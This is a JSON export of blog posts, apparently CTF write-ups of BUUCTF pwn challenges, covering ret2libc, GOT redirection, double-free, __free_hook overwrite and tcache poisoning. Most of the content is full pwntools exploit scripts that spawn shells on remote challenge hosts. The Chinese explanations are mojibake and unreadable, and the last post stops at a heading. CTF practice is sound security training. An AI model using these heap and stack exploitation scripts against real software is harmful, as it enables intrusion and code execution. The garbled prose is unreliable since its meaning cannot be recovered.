{"posts":[{"title":"buu-pwn(1)","content":"xdctf2015_pwn200 **é¢˜ï¼Œç®€å•é¢˜ï¼Œäº”åˆ†é’Ÿèƒ½å‡ºçš„é¢˜ç»™ğŸ‘´æ•´äº†ä¸€ä¸ªå¤šå°æ—¶ï¼Œå…¨æ˜¯æœ¬åœ°çš„libcå’‹ä¹ŸåŠ è½½ä¸ä¸Šå»ï¼Œå¹²è„†ç›´æ¥LibcSearcher æ²¡å•¥å¥½è¯´çš„ï¼Œåªå¼€äº†nx expï¼š from pwn import * from LibcSearcher import LibcSearcher #libc = ELF('./libc.so.6') #elf = ELF('./bof') local = 0 if local == 1: p = process('./bof') else: p = remote('node3.buuoj.cn',25267) p.recvuntil('Welcome to XDCTF2015~!\\n') offset = 0x6C + 0x4 write_plt = 0x080483C0 main_addr = 0x0804851C write_got = 0x0804A01C payload = offset * b'A' + p32(write_plt) + p32(main_addr) + p32(0) + p32(write_got) + p32(0x4) p.sendline(payload) write_addr = u32(p.recv()[0:4]) libc = LibcSearcher('write',write_addr) print(&quot;write:&quot; + hex(write_addr)) libc_base = write_addr - libc.dump('write') print('libcbase:' + hex(libc_base)) system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') print(hex(binsh_addr)) payload = offset * b'A' + p32(system_addr) * 2 + p32(binsh_addr) p.sendline(payload) p.interactive() [BJDCTF 2nd]secret ç¬¬ä¸€æ¬¡ç¢°è§è¿™æ ·çš„é¢˜ï¼Œå¥½é¢˜ï¼ æ²¡æœ‰åšå‡ºæ¥wtcl æ€»ç»“ï¼Œä¸ºå•¥æ²¡åšå‡ºæ¥ï¼Ÿ 1ï¼Œæ‰¾åˆ°æº¢å‡ºç‚¹äº†ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ 2ï¼Œç¢°è§ä¸€å †æ±‡ç¼–ç å°±çœ‹ä¸ä¸‹å»äº†ï¼Œæ²¡æœ‰ä»”ç»†åˆ†æ å®Œæ•´è§£é¢˜è¿‡ç¨‹ï¼š checksecå‘ç°åªå¼€äº†nx æ‹¿åˆ°ida mainå‡½æ•°ï¼š __int64 __fastcall main(__int64 a1, char **a2, char **a3) { myinit(); if ( judge(a1, a2) ) wrong(); system(&quot;cat /flag&quot;); return 0LL; } å‘ç°æ˜¯æœ‰åé—¨çš„ï¼Œä½†æ˜¯å¥½åƒè¦ä¸è§¦å‘ifæ‰å¯ä»¥ï¼Œå¦‚æœifæ¡ä»¶æ»¡è¶³ï¼Œå°±ä¼šè¿›å…¥wrongï¼Œç‚¹è¿›å»çœ‹çœ‹æ˜¯è¿™æ ·çš„ wrongå‡½æ•°ï¼š void __noreturn wrong() { puts(&quot;#====================================#&quot;); puts(&quot;# GAME OVER #&quot;); puts(&quot;#====================================#&quot;); write_string(&quot;# BYE BYE~ #&quot;, 0x12); printf(buf, 0x12LL); puts(&amp;byte_46B0A7); puts(&quot;@====================================@&quot;); exit(0); } å°±é€€å‡ºç¨‹åºäº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç‚¹è¿›å»ifé‡Œé¢çš„judgeå‡½æ•°çœ‹çœ‹ è¿™æ®µæ— æ³•æ˜¾ç¤ºä¸ºä¼ªä»£ç ï¼ˆå¥½åƒæ˜¯å¤§å°é™åˆ¶çš„åŸå› ï¼Œæ”¹idcè„šæœ¬åº”è¯¥å¯ä»¥åç¼–è¯‘ï¼Œä½†æ˜¯æˆ‘ä¸ä¼šorzï¼‰ ä»”ç»†é˜…è¯»æ±‡ç¼–ç ï¼Œå¯ä»¥å‘ç°é‡Œé¢æœ‰å¾ˆå¤šæ¯”è¾ƒçš„æ“ä½œï¼Œæˆ‘ä»¬èµ°åˆ°ç¨‹åºé‡Œï¼Œä¸å¦¨è¾“å…¥ä¸€ä¸ªæ•°å­—çœ‹çœ‹ï¼Œå‘ç°æ˜¯çŒœæ•°å­—çš„æ¸¸æˆï¼Œè¿ç»­çŒœå¯¹å°±å¯ä»¥è·å¾—flagï¼Œä½†æ˜¯è¦çŒœ10000æ¬¡ï¼Œåœ¨myinitå‡½æ•°é‡Œé¢ ç¬¬ä¸€ä¸ªç‚¹æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œé‡Œé¢å­˜äº†10000ï¼Œåº”è¯¥å°±æ˜¯çŒœå¯¹çš„æ¬¡æ•°ï¼Œä½†æ˜¯æ˜¯æŒ‡é’ˆï¼ŒæŒ‡é’ˆéƒ½æ˜¯éå¸¸å±é™©çš„ï½ ç„¶åç¬¬äºŒä¸ªç‚¹å°±æ˜¯æœ‰ä¸€ä¸ªreadï¼Œå¯ä»¥æº¢å‡ºï¼Œæˆ‘ä»¬ç‚¹è¿›å»bufçœ‹çœ‹ å¯ä»¥çœ‹åˆ°é‚£ä¸ªæŒ‡é’ˆå°±åœ¨bufä¸‹é¢0x10å¤„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯æ§çš„ç©ºé—´æ˜¯0x16ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶targetæŒ‡é’ˆã€‚ é‚£ä¹ˆæˆ‘ä»¬æ§åˆ¶åˆ°å“ªé‡Œå‘¢ï¼Ÿ æˆ‘ä»¬åœ¨pwndbgé‡Œé¢å‘ç°printfçš„pltå’Œsystemçš„pltå¾ˆæ¥è¿‘ï¼Œå°±å·®0x10ï¼Œè€Œä¸”æ˜¯printfçš„pltæ¯”systemçš„å¤§0x10ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŠŠtargetæ”¹å†™æˆprintfçš„gotåœ°å€ï¼Œç„¶åæ¯å½“çŒœå¯¹ä¸€æ¬¡targetå°±ä¼šå‡ä¸€ï¼Œå½“æˆ‘ä»¬çŒœå¯¹15æ¬¡ï¼Œç¬¬åå…­æ¬¡çŒœé”™å°±ä¼šè°ƒç”¨printf è€Œè¿™ä¸ªæ—¶å€™ï¼Œprintf@pltå·²ç»è¢«æ”¹æˆäº†system@pltï¼Œç„¶åå­˜åœ¨bufé‡Œé¢çš„å­—ç¬¦ä¸²ä¼šè¢«å½“æˆå‚æ•°ä¼ å…¥systemï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨è¾“å…¥nameçš„æ—¶å€™æŠŠbinshæ‰“è¿›å»å°±å¥½äº† expï¼š from pwn import * local = 0 #context.log_level = 'debug' if local == 1: p = process('./secret') else: p = remote('node3.buuoj.cn',25527) elf = ELF('./secret') printf_got = elf.got['printf'] payload = b'/bin/sh\\x00' + b'A' * (0x10 - 0x8) + b'\\x40\\xD0\\x46' #æœ€åé¢çš„æ˜¯printfçš„gotåœ°å€ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨p32å‘è¿‡å» #print(payload) p.sendline(payload) #pause() number = [0x476B,0x2D38,0x4540,0x3E77,0x3162,0x3F7D,0x357A,0x3CF5,0x2F9E,0x41EA,0x48D8,0x2763,0x474C,0x3809,0x2E63] for i in range(0,15): payload = number[i] p.recvuntil('Secret:') p.sendline(str(payload)) #pause() p.sendlineafter('Secret:','1') p.interactive() ciscn_2019_es_1 ä»Šå¤©å¤ªå¿™äº†ï¼Œåˆšæ¬äº†å®¿èˆï¼Œæ¢äº†æ–°ç¯å¢ƒï¼Œå¿™é‡Œå·é—²æ‰“äº†ä¸€é“å»å¹´çš„å›½èµ›é¢˜ ç›®å‰å°±æ‰¾åˆ°ä¸¤ç§æ€è·¯ï¼Œç¬¬ä¸€ç§æ€è·¯æ‰“fastbinçš„æ—¶å€™æœ‰äº›é—®é¢˜ï¼Œå› ä¸ºä¸å¤ªæ¸…æ¥špythonæ€ä¹ˆä¼ ç©ºå­—ç¬¦ä¸²ä¹‹ç±»çš„é—®é¢˜ï¼Œå¯¼è‡´ç»“æ„ä½“é‡Œé¢çš„æŒ‡é’ˆä¸€ç›´åœ¨å˜ï¼Œæ‰€ä»¥è¿™ç§æ€è·¯ç­‰è¿‡ä¸¤å¤©æœ‰ç©ºçš„æ—¶å€™å†æƒ³æƒ³å§ã€‚ç¬¬äºŒç§æ€è·¯å°±æ˜¯æ‰“__free_hookï¼Œ__free_hook(ready to free) === system(&quot;/bin/sh\\x00&quot;) æ€è·¯ä¸å†™äº†ï¼Œæ³¨é‡Šé‡Œéƒ½æœ‰ exp: from pwn import * from LibcSearcher import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./ciscn_2019_es_1') else: p = remote('node3.buuoj.cn',26804) def add(size,name,num): p.sendlineafter('choice:','1') p.sendlineafter('Please input the size of compary\\'s name',str(size)) p.sendafter('please input name:',name) p.sendafter('please input compary call:',num) def show(index): p.sendlineafter('choice:','2') p.sendlineafter('Please input the index:',str(index)) def delete(index): p.sendlineafter('choice:','3') p.sendlineafter('Please input the index:',str(index)) ''' print(&quot;ç¬¬ä¸€ç§æ€è·¯ï¼šåˆ©ç”¨fastbin attack æ”»å‡»__malloc_hookå‡½æ•°ï¼Œå°šæœªæˆåŠŸ&quot;) #add(0x50,b'A' * 8,b'BBBB') #0 #add(16,b'C' * 16,'DDDDDDDD') #delete(0) #delete(0) #add(0x50,'','') #1 #show(1) #p.recvuntil('name:\\n') #tcache_perthread_struct = u64(p.recv(6) + '\\x00\\x00' - 0x280) #print('tcache:' + hex(tcache_perthread_struct)) ''' print(&quot;ç¬¬äºŒç§æ€è·¯ï¼šåˆ©ç”¨unsorted biné€ƒé€¸å‡ºtcache binï¼Œç„¶åæ”»å‡»__free_hook&quot;) print(&quot;====================== step1 : leak libc =================&quot;) add(0x410,b'A' * 8,b'B') #0 add(0x10,b'/bin/sh\\00',b'D') #1 add(0x10,b'123',b'hack') #2 delete(0) show(0) p.recvuntil('name:\\n') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 96 -0x10 print(hex(__malloc_hook)) libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(&quot;libc base:&quot; + hex(libc_base)) print(&quot;============ step2 : attack __free_hook function =================&quot;) print(&quot;__free_hook(chunk_mem) === system(binsh) &quot;) print(&quot;so we need change '__free_hook' to 'system' &quot;) __free_hook = libc_base + libc.dump(&quot;__free_hook&quot;) system_addr = libc_base + libc.dump(&quot;system&quot;) delete(2) delete(2) add(0x10,p64(__free_hook),b'lemon') #3 add(0x10,p64(system_addr),b'hack') #4 delete(2) p.interactive() ","link":"https://l3mon629.github.io/post/buu-pwn1/"},{"title":"[V&N2020 å…¬å¼€èµ›]easyTHeap","content":"ç”¨è¿™ä¸ªé¢˜æ¥æ€»ç»“ä¸€ä¸‹tcache attack å…³äºtcacheå‚è€ƒäº†è¿™ä¸ªå¸ˆå‚…çš„åšå®¢ï¼šhttps://www.jianshu.com/p/9778331e1337 tcache tcacheç»“æ„ä½“ Tcacheæœºåˆ¶æ˜¯åœ¨libc-2.26ä¸­å¼•å…¥çš„ä¸€ä¸ªæ–°çš„å †ç®¡ç†æœºåˆ¶ã€‚ é¦–å…ˆæ˜¯å¼•è¿›äº†ä¸¤ä¸ªç»“æ„ä½“ï¼Œtcache_perthread_structå’Œtcache_entry tcache_perthread_struct: #define TCACHE_MAX_BINS 64 typedef struct tcache_perthread_struct{ char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; }tcache_perthread_struct; tcache_entry: typedef struct tcache_entry{ struct tcache_entry *next; }tcache_entry; ç¬¬ä¸€ä¸ªç»“æ„ä½“ç”¨æ¥ç®¡ç†å †ï¼Œå¤§å°ä¸º0x240ï¼Œå¯ä»¥ç®¡ç†å¤§å°å°äº0x400çš„å †å—ï¼Œä¸ºå•¥å‘¢ï¼Ÿå†™ä¸ªç®€å•çš„å°demoå¤§å®¶å°±æ˜ç™½äº† #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *p,*q,*r,*s,*x; x = malloc(0x10); p = malloc(0x20); q = malloc(0x20); r = malloc(0x30); s = malloc(0x40); free(p); free(q); free(r); free(s); free(x); void *c1,*c2,*c3; c1 = malloc(0x50); c2 = malloc(0x60); c3 = malloc(0x70); free(c1); free(c2); free(c3); return 0; } ä¸Šé¢ç®€å•çš„ä¾‹å­ï¼Œå°±æ˜¯ç”³è¯·äº†ä»0x10-0x70å¤§å°çš„å †å—ï¼Œç„¶åæˆ‘ä»¬å…¨éƒ¨éƒ½freeæ‰ï¼Œç„¶ågdbè°ƒè¯•ä¸€ä¸‹ä¼šå‘ç°å¦‚ä¸‹ç»“æœ å¯ä»¥çœ‹åˆ°tcache_perthread_structç»“æ„ä½“æ˜¯ä»¥ä¸€ä¸ªå †çš„å½¢å¼å­˜åœ¨äºå †ç©ºé—´ä¸­ç®¡ç†è€…å †å—ï¼Œå…¶å¤§å°ä¸º 0x250ï¼Œç„¶åä¸è€ƒè™‘å…¶prevsizeå’Œsizeä½ï¼Œå‰0x40çš„ç©ºé—´ç®¡ç†ç€æ‰€æœ‰tcache binçš„ä¸ªæ•°ï¼ˆæœ€å¤§æ˜¯7ï¼‰ï¼Œä»0x10å¼€å§‹ï¼Œé‚£ä¹ˆå°±æ˜¯ 0x40 * 8 * 2 = 1024ï¼Œhex(1024) = 0x400ï¼Œæ‰€ä»¥å®ƒæœ€å¤§å¯å­˜åˆ°0x400çš„å †å—ã€‚ å¯¹æ¯”fastbin tcache binä¸fastbinæå…¶ç›¸ä¼¼ä½†æ˜¯åˆæœ‰æ‰€ä¸åŒ åŒï¼šç®¡ç†æ–¹å¼ä¸ºFILOçš„å•é“¾è¡¨å½¢å¼ï¼Œæ¯ä¸€ä¸ªbinsçš„inuseä½æ€»ä¸º1ï¼Œä¸æ‹…å¿ƒåˆå¹¶ å¼‚ï¼šfastbinçš„fdçš„æŒ‡é’ˆæŒ‡å‘chunk ptrï¼Œè€ŒtcacheæŒ‡å‘mem ptrã€‚tcacheä¸æ£€æŸ¥chunkçš„sizeæ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œä¹Ÿå°±æ˜¯è¯´æŒ‡å“ªæ‰“å“ªï¼Œä¸ç”¨è€ƒè™‘sizeä½äº†ï¼Œæ¯”å¦‚æ‰“__malloc_hookä¸ç”¨åˆ†é…åˆ°-0x23çš„ä½ç½®äº†ï¼Œæƒ³åˆ†é…åˆ°å“ªå°±åˆ†é…åˆ°å“ªã€‚tcacheä¸æ£€æŸ¥double freeã€‚tcacheä¼˜å…ˆçº§æœ€é«˜ã€‚ mallocå’Œfreeçš„è¿‡ç¨‹ mallocï¼š malloc(size)ï¼Œè‹¥sizeå°äº0x400ä¼šä¼˜å…ˆä»tcache binsé‡Œé¢å¯»æ‰¾ï¼Œè‹¥æ²¡æœ‰ï¼Œåˆ™å†ä»åˆ«çš„binsé‡Œé¢æ‰¾ã€‚ Tcachebinæœªæ»¡æ—¶ï¼Œå´ä»Fastbin/Smallbinä¸­å–å‡ºå †å—ï¼Œåˆ™ä¼šå°†é“¾ä¸Šçš„å…¶ä»–å †å—éƒ½é“¾å…¥Tcachebinä¸­ã€‚å…¶å…·ä½“ç®—æ³•æ˜¯é¦–å…ˆå°†Fastbin/Smallbinä¸­å–å‡ºçš„å †å—æŒ‡é’ˆè¿›è¡Œä¿å­˜ï¼Œå¹¶åˆ¤æ–­è¯¥å¤§å°å¯¹åº”çš„Tcachebinæ˜¯å¦æœªæ»¡ï¼Œè‹¥æœªæ»¡åˆ™å°†å…¶ä¹‹åçš„å †å—æŒ‰ç…§Fastbin/Smallbinçš„åˆ†é…é¡ºåºå°†å †å—é“¾å…¥Tcachebinä¸­ï¼Œç›´åˆ°å¯¹åº”å¤§å°çš„Tcachebinæ”¾æ»¡æˆ–Fastbin/Smallbinçš„é“¾ä¸ºç©ºï¼Œæœ€åå°†ä¹‹å‰å–å‡ºçš„å †å—æŒ‡é’ˆè¿”å›ç»™ç”¨æˆ·ä½¿ç”¨ã€‚ç”±äºæ˜¯æŒ‰ç…§Fastbin/Smallbinçš„åˆ†é…é¡ºåºå°†å †å—æ”¾å…¥Tcachebinä¸­ï¼Œå› æ­¤ä¸éš¾åˆ¤æ–­ï¼Œæœ€ä»Tcachebinä¸­ç”³è¯·çš„å †å—é¡ºåºæ˜¯ä¸æ­£å¸¸ä»Fastbin/Smallbinä¸­ç”³è¯·å †å—é¡ºåºæ—¶åå‘çš„ã€‚ æ–‡å­—çœ‹ä¸æ‡‚ï¼ˆæˆ‘ä¹Ÿæ²¡çœ‹æ‡‚ orzï¼‰ï¼Ÿæ²¡å…³ç³»ï¼Œä¸Šä»£ç ã€‚ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); return 0; } æ²¡é”™ï¼Œç”³è¯·äº†åä¸ªç›¸åŒå¤§å°çš„chunkï¼Œç„¶åå…¨éƒ¨freeæ‰ï¼Œå…¶ä¸­cå¼€å¤´çš„æ˜¯æ”¾åˆ°tcache binsä¸­çš„ï¼Œfå¼€å¤´çš„æ˜¯tcacheæ»¡äº†ç„¶åè¢«æ”¾åˆ°äº†fastbinsé‡Œé¢ä¸­å»ã€‚ çœ‹ä¸€ä¸‹å†…å­˜åˆ†å¸ƒ ç„¶åæˆ‘ä»¬æ”¹ä¸€ä¸‹æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); void *t1,*t2,*t3,*t4,*t5,*t6,*t7; void *a1,*a2,*a3; t1 = malloc(0x10); t2 = malloc(0x10); t3 = malloc(0x10); t4 = malloc(0x10); t5 = malloc(0x10); t6 = malloc(0x10); t7 = malloc(0x10); a1 = malloc(0x10); return 0; } æ€è·¯å°±æ˜¯æˆ‘ä»¬å°†tcachebinå¡«æ»¡ï¼Œç„¶åfree3æ¬¡åŒæ ·å¤§å°çš„chunkï¼Œå‘ç°è¿›å…¥åˆ°fastbiné‡Œé¢ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡mallocå°†tcachebinå…¨éƒ¨æ¸…ç©ºï¼Œå¦‚ä¸‹å›¾ å¯ä»¥çœ‹åˆ°æ­¤æ—¶tcachebinå·²ç»ç©ºäº† fastbiné‡Œé¢æ˜¯è¿™æ ·çš„ ç„¶åå†mallocä¸€æ¬¡ï¼Œå‘ç°fastbinè¢«æ¸…ç©ºï¼Œå‰©ä½™çš„ä¸¤ä¸ªbinè¢«ç§»åˆ°tcachebiné‡Œé¢å» æœ¬æ¥æ˜¯350æŒ‡å‘330 ç§»å…¥åˆ°tcacheåå˜æˆäº†340(0x350 - 0x10)æŒ‡å‘äº†360 è¯æ˜äº†å‰æ–‡çš„ç»“è®ºï¼Œâ€œå› æ­¤ä¸éš¾åˆ¤æ–­ï¼Œæœ€ä»Tcachebinä¸­ç”³è¯·çš„å †å—é¡ºåºæ˜¯ä¸æ­£å¸¸ä»Fastbin/Smallbinä¸­ç”³è¯·å †å—é¡ºåºæ—¶åå‘çš„â€ã€‚ åˆ©ç”¨æ–¹æ³• è´´ä¸ªå¤§ä½¬æ€»ç»“çš„ï¼Œæˆ‘ä»”ç»†çœ‹äº†çœ‹è¿™å‡ ä¸ªæ–¹æ³•çš„è¯´æ˜ï¼Œæœ¬é¢˜ç›®åº”è¯¥ç”¨äº†ä»¥ä¸‹å‰ä¸‰ä¸ªæ¼æ´ï¼Œå…¶å®å«å•¥åä¸é‡è¦ï¼Œä¼šç”¨å°±è¡Œ~ Tcache poisoningï¼ˆtcache æŠ•æ¯’ï¼‰ åœ¨ä¸Šä¸€éƒ¨åˆ†ä¸­ä¹Ÿæåˆ°è¿‡è¿™ç§æ–¹æ³•ã€‚ä¸Fastbin Attackç±»ä¼¼ï¼Œç¯¡æ”¹Tcachebinä¸­çš„fdå­—æ®µï¼Œå¯¼è‡´åœ¨ç”³è¯·è¢«ç¯¡æ”¹å †å—åçš„ä¸‹ä¸€ä¸ªå †å—æ—¶èƒ½å¤Ÿç”³è¯·åˆ°ä»»æ„åœ°å€ã€‚ä¸Fastbinç›¸æ¯”ï¼ŒTcachebinä¸­ä¸ºäº†å¾—åˆ°æ›´é«˜çš„æ•ˆç‡è€Œèˆå»äº†å®‰å…¨æ€§ï¼Œåœ¨è¿›è¡Œç”³è¯·æ—¶æ²¡æœ‰å¯¹sizeä½è¿›è¡Œæ ¡éªŒï¼Œè€Œä¸”ç”±äºTcachebinä¸­çš„fdæ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªå †å—çš„fd(Fastbinçš„fdæ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªå †å—çš„å †å¤´)ï¼Œå› æ­¤æŒ‡å‘çš„åœ°å€å³æ˜¯ç”³è¯·åå†™æ•°æ®çš„åœ°å€ï¼Œä¸å†éœ€è¦å»è€ƒè™‘å †å¤´çš„åç§»ã€‚ Tcache dupï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼‰ è¿™æ˜¯Tcacheæœºåˆ¶åˆšæ¨å‡ºçš„å‡ ä¸ªç‰ˆæœ¬ä¸­ï¼Œåœ¨è¿›è¡Œfreeæ“ä½œæ—¶æ²¡æœ‰å¯¹è¿™ä¸ªå †å—è¿›è¡Œä¸€ä¸ªå®‰å…¨æ£€æµ‹è€Œå¯¼è‡´å¯ä»¥å¯¹åŒä¸€ä¸ªå †å—è¿›è¡Œå¤šæ¬¡freeï¼Œé‚£ä¹ˆå°±ä¼šå˜æˆä¸€ä¸ªTcachebiné“¾ä¸Šé“¾äº†ä¸¤ä¸ªç›¸åŒçš„å †å—(æˆ‘æŒ‡å‘æˆ‘è‡ªå·±)ï¼Œåé¢ä¹Ÿå°±ä¸ç”¨å¤šè¯´äº†ã€‚ä½†å€¼å¾—ä¸€æçš„æ˜¯åœ¨libc-2.29ç‰ˆæœ¬ä¸­åŠ å…¥äº†æ£€æŸ¥æœºåˆ¶(æºç çš„4201-4216è¡Œ)ï¼Œä¼šåœ¨å †å—è¿›è¡Œfreeæ—¶æ£€æŸ¥è¿™ä¸ªå †å—æ˜¯å¦å·²ç»å­˜åœ¨äºè¿™æ¡é“¾ä¸Šï¼Œå¦‚æœå­˜åœ¨åˆ™ä¼šæŠ¥&quot;free():double free detected in tcache 2&quot;çš„é”™è¯¯ï¼Œå› æ­¤è¿™ç§ç›´æ¥double freeåˆ©ç”¨æ–¹å¼å­˜åœ¨äºlibc-2.26è‡³libc-2.28çš„ç‰ˆæœ¬ä¸­ã€‚ Tcache perthread corruption ï¼ˆç»“æ„ä½“æ±¡æŸ“ï¼‰ åœ¨æœ€å¼€å§‹ä»‹ç»ç»“æ„ä½“æ—¶æåˆ°çš„tcache_perthread_structç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“sizeä¸º0x250ï¼Œæ˜¯ç®¡ç†æ•´ä¸ªTcachebinçš„ç»“æ„ä½“ï¼Œå¦‚æœå¯¹è¿™ä¸ªç»“æ„ä½“æœ‰å†™æƒé™ï¼Œé‚£ä¹ˆå¯ä»¥æ§åˆ¶ä»»æ„å¤§å°Tcachebinçš„å…¥å£åœ°å€ã€‚ U2Tï¼ˆç¿»è¯‘å›æ­»äº†ï¼‰ U2Tå³Unsortbin 2 Tcachebinï¼Œè¿™ç§å«æ³•æ˜¯åœ¨ä¸€ç¯‡æ–‡ç« ä¸­çœ‹åˆ°çš„ï¼Œä¹Ÿåªçœ‹åˆ°è¿‡ä¸€æ¬¡ï¼Œä¸»è¦æ˜¯é…åˆOff By Oneæˆ–Off By NULLçš„æ¼æ´ï¼Œä½¿Unsortbinåœ¨åˆå¹¶è¿‡ç¨‹ä¸­å°†ä¸­é—´çš„Tcachebinåˆå¹¶ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹fdå­—æ®µçš„æ•ˆæœã€‚ é¢˜ç›® é€†å‘ ç¨å¾®é€†ä¸€ä¸‹å°±å‘ç°äº†deleteçš„æ—¶å€™å­˜åœ¨UAFæ¼æ´ ä¸è¿‡å¿…é¡»è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åªèƒ½malloc 7æ¬¡ï¼Œfree 3æ¬¡ pwn it !!! è¿™é“é¢˜ä¿æŠ¤å…¨å¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ”»å‡»__malloc_hook æ€è·¯ï¼š 1ï¼Œæ”»å‡»__malloc_hookï¼Œå¿…é¡»è¦ä¼ªé€ chunkï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨tcacheçš„ç‰¹ç‚¹ï¼Œåˆ©ç”¨ç»“æ„ä½“æ±¡æŸ“ï¼Œå°†tcache_perthread_structçš„æŒ‡é’ˆåŸŸæ”¹ä¸º__malloc_hooké™„è¿‘ 2ï¼Œæ±¡æŸ“ç»“æ„ä½“ï¼Œå¿…é¡»è¦èƒ½åˆ†é…åˆ°ç»“æ„ä½“ä¸Šï¼Œæˆ‘ä»¬å¯é€‰æ‹©double freeï¼Œä½†æ˜¯å‰æå¿…é¡»è¦çŸ¥é“ç»“æ„ä½“çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨showæ¥æ³„æ¼åœ°å€ï¼Œmalloc(size),free(),free()ï¼Œè¿™æ ·è¯¥chunkå°±è®°å½•äº†è‡ªå·±çš„åœ°å€ï¼Œå‡å»0x250å°±æ˜¯ç»“æ„ä½“çš„åœ°å€ 3ï¼Œæ‰“one_gadgetï¼Œå¿…é¡»è¦çŸ¥é“libcåŸºåœ°å€ï¼Œæˆ‘ä»¬åˆ©ç”¨freeæ€çš„ç»“æ„ä½“å †å—ï¼ˆ0x250ä¼šè¿›å…¥unsorted binï¼‰ï¼Œæ³„æ¼main_arenaä¸Šæ–¹çš„__malloc_hookæ‹¿åˆ°åŸºåœ°å€ ä¸€ç§æ–¹æ³• å””â€¦â€¦ï¼Œæœ¬åœ°åªæœ‰2.28ç‰ˆæœ¬çš„libcï¼Œæ‰€ä»¥æœ¬åœ°ä¸å¯èƒ½æ‰“é€šï¼Œç®€å•å†™äº†ä¸€ä¸‹ï¼Œç„¶åone_gadgetå’Œæœ€åreallocè°ƒæ ˆæ¡¢çš„æ—¶å€™éƒ½æ˜¯æŠ„çš„åˆ«çš„å¸ˆå‚…çš„åç§»orz exp: from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',26169) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;================ step1:é€ƒé€¸tcache ==============&quot;) print(&quot;-------- åˆ©ç”¨double freeï¼Œå°†fd ptr å†™åˆ° tcacheå¤„ -------&quot;) add(0x50) #0 free(0) free(0) add(0x50) #1 show(1) leak_tcache = u64(p.recv(6) + b'\\00\\00') - 0x250 print(&quot;tcache is in :&quot; + hex(leak_tcache)) edit(1,p64(leak_tcache)) print('----- æ”¹å†™tcahcheç»“æ„ä½“ä¸­å †å—çš„æ•°é‡ï¼Œä½¿ä»¥åçš„chunkå¯ä»¥ä¸è¿›å…¥tcache -----') add(0x50) #2 add(0x50) #3 this is tcache_perthread_struct ä½†æ˜¯è¿™é‡Œçš„sizeä»ç„¶æ˜¯0x251 edit(3,b'a' * 0x30) print('================= step2:æ³„æ¼libc ==============') print('----- åˆ©ç”¨3å·å †å—ï¼ˆtcacheç»“æ„ä½“å †å—ï¼‰ï¼Œé‡Šæ”¾åè¿›å…¥unsorted binä¸­ï¼Œæ³„æ¼libc -----') free(3) show(3) leak_libc = u64(p.recv(6) + b'\\00\\00') - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc: 2.27 leak the address is 'main_arena + 96' print('the libcbase is :'+hex(leak_libc)) print('----- è·å¾—ä¸€äº›å‡½æ•°å’Œone gadgetçš„åœ°å€ ------') #one_gadget = [0x41982,0x419d6,0xdf882] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = leak_libc + one_gadget_list[1] malloc_hook = leak_libc + libc.symbols['__malloc_hook'] realloc_hook = leak_libc + libc.symbols['realloc'] print(&quot;================== step3: æ”»å‡» __malloc_hook ============&quot;) add(0x50) #4 edit(4, p64(0) * 9 + p64(malloc_hook - 0x13)) add(0x20) # fake chunk paylaod = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook + 8) edit(5, paylaod) add(0x20) p.interactive() å¦ä¸€ç§æ–¹æ³• 